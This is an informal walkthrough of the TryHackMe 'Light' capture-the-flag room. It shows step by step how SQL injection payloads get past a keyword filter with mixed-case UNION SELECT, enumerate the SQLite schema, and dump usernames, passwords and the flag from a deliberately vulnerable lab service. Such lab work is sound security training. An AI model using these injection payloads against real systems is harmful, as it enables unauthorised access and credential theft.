2026/07/03
https://tryhackme.com/room/lightroom
Light
Welcome to the Light database application!
easy

https://tryhackme.com/p/tryhackme tryhackme
https://tryhackme.com/p/hadrian3689 hadrian3689

machine ip 10.66.142.90


description

I am working on a database application called Light! Would you like to try it out?
If so, the application is running on port 1337. You can connect to it using nc 10.66.142.90 1337
You can use the username smokey in order to get started.

Note: Please allow the service 2 - 3 minutes to fully start before connecting to it.




$ ping -c 3 10.66.142.90
PING 10.66.142.90 (10.66.142.90) 56(84) bytes of data.
64 bytes from 10.66.142.90: icmp_seq=1 ttl=62 time=197 ms
64 bytes from 10.66.142.90: icmp_seq=2 ttl=62 time=220 ms
64 bytes from 10.66.142.90: icmp_seq=3 ttl=62 time=244 ms

--- 10.66.142.90 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2001ms
rtt min/avg/max/mdev = 196.913/220.374/244.211/19.311 ms


nmap -sV -sC -p- -T4 10.66.142.90




the machine says to connect to the server directly so we do so



$ nmap -T4 10.66.142.90            
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-03 14:15 UTC
Nmap scan report for 10.66.142.90
Host is up (0.21s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 5.46 seconds


note port 1337 is not on list. whatever


$ nc 10.66.142.90 1337
Welcome to the Light database!
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL

$ ssh smokey@10.66.142.90
smokey@10.66.142.90's password: 
Permission denied, please try again.


huh


Please enter your username: admin
Username not found.
Please enter your username: '
Error: unrecognized token: "' LIMIT 30"
Please enter your username: ' OR '1'='1' ---
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)


ok


Please enter your username: ' OR SUBSTRING('', 1, 30) OR 'a
Error: no such function: SUBSTRING


okay hm

Please enter your username: union
Ahh there is a word in there I don't like :(
Please enter your username: select
Ahh there is a word in there I don't like :(



Please enter your username: ' OR '1'='1
Password: tF8tj2o94WE4LKC
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL


tF8tj2o94WE4LKC is a new password...


my guess is the query is
SELECT password FROM users WHERE username='QUERY' LIMIT 30;



Please enter your username: ' or username=USER() or '1'='2
Error: no such function: USER


i gotta find a way to comment stuff GRAGH

url encode the hyphen?

hyphen isn't url encodable. i mean, it is just hyphen itself

maybe /* then?

%2F%2A

' %2F%2A

actually how do i do this

searching on the web apparently '#' is also a comment type

Please enter your username: ' #
Error: unrecognized token: "#"

url encode it

' %23

nevermind whatever ugh



back, go back. can i type select

Please enter your username: sElect
Username not found.
Please enter your username: uNion
Username not found.


ok!!!!!!!!!


' uniOn sElect 2 where '1'='1

Please enter your username: ' uniOn sElect 1 where '1'='1
Password: 1
Please enter your username: ' uniOn sElect 2 where '1'='1
Password: 2


we're GETTING somewhere now!!!


Please enter your username: ' uniOn sElect information_schema.tables where '1'='1
Error: no such column: information_schema.tables


' uniOn sElect table_name from information_schema.COLUMNS where '1'='1

information_schema doesn't appear to exist.


' uniOn sElect 1,2 where '1'='1


Please enter your username: ' uniOn sElect 1,2 where '1'='1
Error: SELECTs to the left and right of UNION do not have the same number of result columns


' uniOn sElect @@version where '1'='1


Please enter your username: ' uniOn sElect banner FROM v$version where '1'='1
Error: no such table: v$version
Please enter your username: ' uniOn sElect version FROM v$instance where '1'='1
Error: no such table: v$instance
Please enter your username: ' uniOn sElect version() where '1'='1
Error: no such function: version
Please enter your username: ' uniOn sElect @@version where '1'='1
Error: unrecognized token: "@"
Please enter your username: ' uniOn sElect %40%40version where '1'='1
Error: near "%": syntax error
Please enter your username: ' uniOn sElect SERVERPROPERTY('productversion') where '1'='1
Error: no such function: SERVERPROPERTY


Please enter your username: ' uniOn sElect sqlite_version() where '1'='1
Password: 3.31.1


GOLDDDDDDD


Please enter your username: ' uniOn sElect name FROM sqlite_master WHERE type='table
Password: admintable


' uniOn sElect username FROM admintable WHERE '1'='1


Please enter your username: ' uniOn sElect username FROM admintable WHERE '1'='1
Password: TryHackMeAdmin



' uniOn sElect password FROM admintable WHERE '1'='1



Please enter your username: ' uniOn sElect password FROM admintable WHERE '1'='1
Password: THM{SQLit3_InJ3cTion_is_SimplE_nO?}


' uniOn sElect name FROM sqlite_master WHERE rowid='3


Please enter your username: ' uniOn sElect name FROM sqlite_master WHERE rowid='0
Username not found.
Please enter your username: ' uniOn sElect name FROM sqlite_master WHERE rowid='1
Password: usertable
Please enter your username: ' uniOn sElect name FROM sqlite_master WHERE rowid='2
Password: admintable
Please enter your username: ' uniOn sElect name FROM sqlite_master WHERE rowid='3
Username not found.


usertable

' uniOn sElect password FROM usertable WHERE '3'='3

Please enter your username: ' uniOn sElect username FROM usertable WHERE '3'='3
Password: alice


okay im in

Please enter your username: ' uniOn sElect username FROM usertable WHERE '3'='3
Password: alice
Please enter your username: ' uniOn sElect password FROM usertable WHERE '3'='3
Password: 7DV4dwA0g5FacRe
Please enter your username: alice
Password: tF8tj2o94WE4LKC

though order seems to be completely random...?



' uniOn sElect username FROM usertable WHERE rowid='9

1:alice, 2:rob, 3:john, 4:michael, 5:smokey, 6:hazel, 7:ralph, 8:steve




Please enter your username: alice
Password: tF8tj2o94WE4LKC
Please enter your username: rob
Password: yAn4fPaF2qpCKpR
Please enter your username: john
Password: e74tqwRh2oApPo6
Please enter your username: michael
Password: 7DV4dwA0g5FacRe
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
Please enter your username: hazel
Password: EcSuU35WlVipjXG
Please enter your username: ralph
Password: YO1U9O1m52aJImA
Please enter your username: steve
Password: WObjufHX1foR8d7


' uniOn sElect username FROM admintable where rowid='1

Please enter your username: ' uniOn sElect username FROM admintable where rowid='1
Password: TryHackMeAdmin
Please enter your username: ' uniOn sElect password FROM admintable where rowid='1
Password: mamZtAuMlrsEy5bp6q17



done



